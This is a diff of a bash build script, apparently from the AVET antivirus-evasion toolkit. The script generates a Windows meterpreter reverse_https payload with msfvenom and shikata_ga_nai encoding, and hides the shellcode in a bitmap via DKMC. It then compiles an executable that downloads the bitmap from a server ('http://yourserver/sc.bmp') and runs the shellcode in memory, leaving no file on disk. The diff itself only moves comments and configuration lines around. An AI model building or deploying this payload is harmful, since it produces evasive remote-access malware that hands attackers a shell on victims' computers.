@@ -1,5 +1,7 @@
 #!/bin/bash  
 
+
+#DESCRIPTION_START
 # +++ WARNING +++
 # Currently, the BMP shellcode does not execute properly! It seems that DKMC generates invalid shellcode.
 
@@ -7,12 +9,8 @@
 # which is nice, this is hiding the shellcode in a valid bitmap file
 # DKMC has to be in a directory side by side to avet eg. ~/tools/avet ~/tools/DKMC for running this script
 # for more look here https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/
+#DESCRIPTION_END
 
-# The generated shellcode must be hosted on a HTTP server.
-# Call your executable like:
-# output.exe http://yourserver/sc.bmp
-# The executable will then download the shellcode to memory via sockets (no file is dropped on disk).
-# Next, the shellcode is executed.
 
 # print AVET logo
 cat banner.txt
@@ -28,9 +26,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# don't enable debug output because printing the whole bmp payload takes a lot of time
+#enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, format correct for DKMC and run DKMC for making the bitmap file
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
@@ -55,9 +59,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# don't enable debug output because printing the whole bmp payload takes a lot of time
-#enable_debug_print
-
 # compile 
 $win32_compiler -s -o output/dkmc_downloadexecshc_revhttps_win32.exe source/avet.c -lwsock32 -lWs2_32
 strip output/dkmc_downloadexecshc_revhttps_win32.exe
@@ -71,3 +72,11 @@ dkmc_downloadexecshc_revhttps_win32.exe http://yourserver/sc.bmp
 The executable will then download the shellcode to memory via sockets (no file is dropped on disk).
 Next, the shellcode is executed."
 
+
+#USAGE_START
+# The generated shellcode must be hosted on a HTTP server.
+# Call your executable like:
+# output.exe http://yourserver/sc.bmp
+# The executable will then download the shellcode to memory via sockets (no file is dropped on disk).
+# Next, the shellcode is executed.
+#USAGE_END
